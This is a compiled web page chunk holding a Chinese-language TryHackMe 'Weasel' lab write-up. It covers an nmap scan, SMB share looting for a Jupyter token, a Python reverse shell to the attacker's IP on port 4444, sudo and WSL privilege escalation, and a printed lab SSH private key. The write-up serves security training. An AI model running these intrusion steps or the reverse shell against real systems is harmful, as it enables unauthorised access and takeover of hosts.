"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9050],{98186:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>o,metadata:()=>r,toc:()=>d});var t=s(74848),i=s(28453);const o={sidebar_position:131,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","SUDO"],title:"Weasel",description:"Weasel",sidebar_label:"Weasel",slug:"/tryhackme/131"},a="Weasel",r={id:"box/TryHackMe/131",title:"Weasel",description:"Weasel",source:"@site/docs/box/TryHackMe/131.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/131",permalink:"/docs/tryhackme/131",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6267\u884c",permalink:"/docs/tags/\u547d\u4ee4\u6267\u884c"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:131,frontMatter:{sidebar_position:131,tags:["Easy","Linux","\u547d\u4ee4\u6267\u884c","SUDO"],title:"Weasel",description:"Weasel",sidebar_label:"Weasel",slug:"/tryhackme/131"},sidebar:"boxSidebar",previous:{title:"NerdHerd",permalink:"/docs/tryhackme/130"},next:{title:"Metamorphosis",permalink:"/docs/tryhackme/132"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"139/445",id:"139445",level:2},{value:"8888",id:"8888",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"dev-datasci (WSL)",id:"dev-datasci-wsl",level:3},{value:"dev-datasci(WSL) \u2014&gt; root (WSL)",id:"dev-datasciwsl--root-wsl",level:3},{value:"\u63d0\u9192",id:"\u63d0\u9192",level:2},{value:"\u7b2c\u4e00\u79cd\u65b9\u5f0f (WSL \u6302\u8f7d)",id:"\u7b2c\u4e00\u79cd\u65b9\u5f0f-wsl-\u6302\u8f7d",level:3},{value:"\u7b2c\u4e8c\u79cd\u65b9\u5f0f (Windows \u63d0\u6743)",id:"\u7b2c\u4e8c\u79cd\u65b9\u5f0f-windows-\u63d0\u6743",level:3},{value:"dev-datasci-lowpriv (Windows)",id:"dev-datasci-lowpriv-windows",level:4},{value:"dev-datasci-lowpriv (Windows) \u2014&gt; administrators(Windows)",id:"dev-datasci-lowpriv-windows--administratorswindows",level:4}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"weasel",children:"Weasel"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150720.png",alt:"image-20240709150718304"})}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-148-112:~/weasel# nmap -sTCV -p- --min-rate 1000 10.10.230.180\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-02 13:01 BST\nNmap scan report for ip-10-10-230-180.eu-west-1.compute.internal (10.10.230.180)\nHost is up (0.00022s latency).\nNot shown: 65520 closed ports\nPORT      STATE SERVICE       VERSION\n22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey: \n|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)\n|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)\n|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (EdDSA)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=DEV-DATASCI-JUP\n| Not valid before: 2023-10-01T11:31:04\n|_Not valid after:  2024-04-01T11:31:04\n|_ssl-date: 2023-10-02T12:02:53+00:00; -1s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n8888/tcp  open  http          Tornado httpd 6.0.3\n| http-robots.txt: 1 disallowed entry \n|_/ \n|_http-server-header: TornadoServer/6.0.3\n| http-title: Jupyter Notebook\n|_Requested resource was /login?next=%2Ftree%3F\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:65:7F:DE:4F:F9 (Unknown)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n|_nbstat: NetBIOS name: DEV-DATASCI-JUP, NetBIOS user: <unknown>, NetBIOS MAC: 02:65:7f:de:4f:f9 (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-10-02 13:02:55\n|_  start_date: 1600-12-31 23:58:45\n"})}),"\n",(0,t.jsx)(n.h2,{id:"139445",children:"139/445"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-148-112:~/weasel# smbmap.py -H  10.10.230.180 -u anonymous\n\n    ________  ___      ___  _______   ___      ___       __         _______\n   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /\' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __\'  \\    (|  /\n   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   \n                     https://github.com/ShawnDEvans/smbmap\n\n                                                                                                    \n[+] IP: 10.10.230.180:445\tName: ip-10-10-230-180.eu-west-1.compute.internal\tStatus: Guest session   \t\n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tADMIN$                                            \tNO ACCESS\tRemote Admin\n\tC$                                                \tNO ACCESS\tDefault share\n\tdatasci-team                                      \tREAD, WRITE\t\n\tIPC$                                              \tREAD ONLY\tRemote IPC\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528 SMB \u5de5\u5177\u8fde\u63a5\u6211\u4eec\u7684 datasci-team \u7684\u5171\u4eab, \u901a\u8fc7\u5176\u5171\u4eab"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u6211\u770b\u5230\u5230\u4e00\u4e2a\u7279\u6b8a\u7684\u540e\u7f00 ipynb, \u53d1\u73b0\u5176\u5c5e\u4e8ejupyter \u7a0b\u5e8f"}),"\n",(0,t.jsx)(n.li,{children:"\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6 misc \u4e0b\u6709\u4e00\u4e2a token,\u90a3\u4e48\u8fd9\u5e94\u8be5\u662f jupyter \u7684\u8bbf\u95ee token"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-148-112:~/weasel# smbclient \\\\\\\\10.10.230.180\\\\datasci-team -u anonymous\nWARNING: The "syslog" option is deprecated\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Oct  2 13:29:10 2023\n  ..                                  D        0  Mon Oct  2 13:29:10 2023\n  .ipynb_checkpoints                 DA        0  Thu Aug 25 16:26:47 2022\n  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 16:26:46 2022\n  misc                               DA        0  Thu Aug 25 16:26:47 2022\n  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 16:26:46 2022\n  papers                             DA        0  Thu Aug 25 16:26:47 2022\n  pics                               DA        0  Thu Aug 25 16:26:47 2022\n  requirements.txt                    A       12  Thu Aug 25 16:26:46 2022\n  weasel.ipynb                        A     4308  Thu Aug 25 16:26:46 2022\n  weasel.txt                          A       51  Thu Aug 25 16:26:46 2022\n\n\t\t15587583 blocks of size 4096. 8948276 blocks available\nsmb: \\> cd misc\\\nsmb: \\misc\\> ls\n  .                                  DA        0  Thu Aug 25 16:26:47 2022\n  ..                                 DA        0  Thu Aug 25 16:26:47 2022\n  jupyter-token.txt                   A       52  Thu Aug 25 16:26:47 2022\n'})}),"\n",(0,t.jsx)(n.h2,{id:"8888",children:"8888"}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee 8888 \u7aef\u53e3\u6211\u53d1\u73b0\u8fd9\u5c31\u662f jupyter \u7f51\u7ad9, \u5e76\u4e14\u5176\u8981\u6c42\u4e00\u4e2a token , \u56e0\u6b64\u6211\u5229\u7528\u5728 SMB \u670d\u52a1\u5f97\u5230\u7684 token \u6210\u529f\u8bbf\u95ee"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150744.png",alt:"image-20240709150742971"})}),"\n",(0,t.jsxs)(n.p,{children:["\u63a5\u7740\u7ecf\u8fc7\u641c\u7d22\u6211\u53d1\u73b0\u4e86\u5229\u7528\u5176\u6765\u6267\u884c\u547d\u4ee4\u7684\u65b9\u5f0f ",(0,t.jsx)(n.a,{href:"https://saturncloud.io/blog/how-to-execute-terminal-commands-in-jupyter-notebook/",children:"How to Execute Terminal Commands in Jupyter Notebook | Saturn Cloud Blog"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150753.png",alt:"image-20240709150751566"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"dev-datasci-wsl",children:"dev-datasci (WSL)"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u5728\u6b64\u60f3\u5229\u7528\u4e0a\u9762\u83b7\u5f97\u7684\u547d\u4ee4\u6267\u884c\u65b9\u5f0f\u83b7\u53d6 Shell, \u4f46\u662f\u6267\u884c\u9047\u5230\u70b9\u95ee\u9898, \u6240\u4ee5\u6211\u76f4\u63a5\u8f6c\u6362\u65b9\u5f0f\u76f4\u63a5\u4f7f\u7528 python \u7684reverse shell \u8fdb\u884c\u8fde\u63a5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.148.112",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150812.png",alt:"image-20240709150810628"})}),"\n",(0,t.jsx)(n.h3,{id:"dev-datasciwsl--root-wsl",children:"dev-datasci(WSL) \u2014> root (WSL)"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u53d1\u73b0\u7528\u6237\u5b58\u5728 SUDO \u7279\u6743\u5e76\u4e14\u53ef\u4ee5\u4ee5\u65e0\u5bc6\u7801\u7684\u5f62\u5f0f\u6267\u884c\u4e00\u4e2a\u7a0b\u5e8f, \u800c\u4e14\u8fd9\u4e2a\u7a0b\u7a0b\u5e8f\u6070\u597d\u53c8\u4e0d\u5b58\u5728, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u8fd9\u4e2a\u7a0b\u5e8f\u6765\u5b9e\u73b0\u63d0\u6743"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150820.png",alt:"image-20240709150818967"})}),"\n",(0,t.jsx)(n.h2,{id:"\u63d0\u9192",children:"\u63d0\u9192"}),"\n",(0,t.jsx)(n.p,{children:"\u5982\u679c\u4f60\u6b64\u65f6\u67e5\u770b\u4f60\u4f1a\u53d1\u73b0\u4f60\u5e76\u6ca1\u6709\u83b7\u53d6\u5230 flag, \u6240\u4ee5\u731c\u6d4b\u5982\u4e0b:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"docker \u73af\u5883 : \u6ca1\u6709 .docker \u7279\u6b8a\u6587\u4ef6, \u6240\u4ee5\u6392\u9664"}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"WSL : \u786e\u8ba4\u662f\u5728\u5176\u4e0b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@DEV-DATASCI-JUP:/# uname -a\nLinux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux\n"})}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"\u7b2c\u4e00\u79cd\u65b9\u5f0f-wsl-\u6302\u8f7d",children:"\u7b2c\u4e00\u79cd\u65b9\u5f0f (WSL \u6302\u8f7d)"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u53ef\u4ee5\u5c06 Windows \u7684 C \u76d8\u6765\u6302\u8f7d\u5728 Linux \u4e2d\u5b9e\u73b0\u8bbf\u95ee, \u8fd9\u6837\u53ef\u4ee5\u65e0\u89c6\u4efb\u52a1\u6743\u9650\u68c0\u67e5, \u4f46\u662f\u524d\u63d0\u662f\u6211\u4eec\u5728\u4e00\u4e2a root \u7684\u4f1a\u8bdd\u4e2d, \u5426\u5219\u65e0\u6cd5\u5b9e\u73b0\u6302\u8f7d\u7684\u9700\u6c42"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@DEV-DATASCI-JUP:/# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@DEV-DATASCI-JUP:/# mount -t drvfs C: /mnt/c\nroot@DEV-DATASCI-JUP:/# cd /mnt/c\nroot@DEV-DATASCI-JUP:/mnt/c# ls\nls: cannot read symbolic link 'Documents and Settings': Permission denied\nls: cannot access 'pagefile.sys': Permission denied\n'$Recycle.Bin'             PerfLogs        'Program Files (x86)'   Recovery                     Users     datasci-team\n'Documents and Settings'  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u7b2c\u4e8c\u79cd\u65b9\u5f0f-windows-\u63d0\u6743",children:"\u7b2c\u4e8c\u79cd\u65b9\u5f0f (Windows \u63d0\u6743)"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u7528\u6237 dev-datasci \u5bb6\u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a SSH \u5bc6\u94a5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u8fdb\u884c\u8fde\u63a5"}),"\n",(0,t.jsx)(n.h4,{id:"dev-datasci-lowpriv-windows",children:"dev-datasci-lowpriv (Windows)"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) root@DEV-DATASCI-JUP:/home/dev-datasci# cat dev-datasci-lowpriv_id_ed25519 \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f\nJwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw\nAAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E\nqiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl\nVQAQI=\n-----END OPENSSH PRIVATE KEY-----\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-150847.png",alt:"image-20240709150845835"})}),"\n",(0,t.jsx)(n.h4,{id:"dev-datasci-lowpriv-windows--administratorswindows",children:"dev-datasci-lowpriv (Windows) \u2014> administrators(Windows)"})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>r});var t=s(96540);const i={},o=t.createContext(i);function a(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(o.Provider,{value:n},e.children)}}}]);